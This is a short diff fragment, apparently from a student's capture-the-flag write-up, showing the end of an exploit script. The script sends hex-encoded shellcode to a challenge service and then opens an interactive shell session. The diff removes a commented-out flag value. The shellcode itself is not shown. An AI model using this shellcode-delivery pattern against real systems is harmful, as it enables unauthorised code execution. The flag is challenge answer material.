@@ -85,8 +85,7 @@ while_exit:
 
 print(shellcode.hex())
 conn.recvuntil(b'please enter your (hex-encoded) shellcode, at most 4096 bytes:')
-conn.sendline(shellcode.hex())
-#softsec{jqCF9ssJUHNbQN425vd73x0f4g1gFI7L7ANl7ABxE1i3ZqWWpKWLhqF4-G3U3lVB}
+conn.sendline(shellcode.hex().encode())
 conn.interactive()
 ```
 - i got the following flag:
